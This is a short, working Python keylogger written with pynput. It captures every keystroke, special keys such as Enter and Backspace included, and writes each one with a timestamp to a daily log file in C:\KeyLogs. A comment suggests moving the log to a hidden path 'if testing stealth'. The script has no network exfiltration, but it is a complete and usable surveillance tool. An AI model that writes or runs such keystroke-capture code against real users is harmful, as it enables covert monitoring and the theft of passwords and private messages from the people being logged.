from pynput import keyboard
import logging
from datetime import datetime
import os

# Create a logs directory
log_dir = "C:\\KeyLogs"  # Change to a hidden path if testing stealth
os.makedirs(log_dir, exist_ok=True)

# Log file with timestamp
log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d')}.txt")

# Configure logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s',
    datefmt='%H:%M:%S'
)

print(f"[*] Keylogger started. Logging to: {log_file}")
print("[*] Press Ctrl+C to stop.")

def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        # Special keys (Enter, Space, Backspace, etc.)
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.caps_lock: "[CAPSLOCK]",
        }
        logging.info(special_keys.get(key, f"[{key.name.upper()}]"))

# Start listener
with keyboard.Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        print("\n[!] Keylogger stopped.")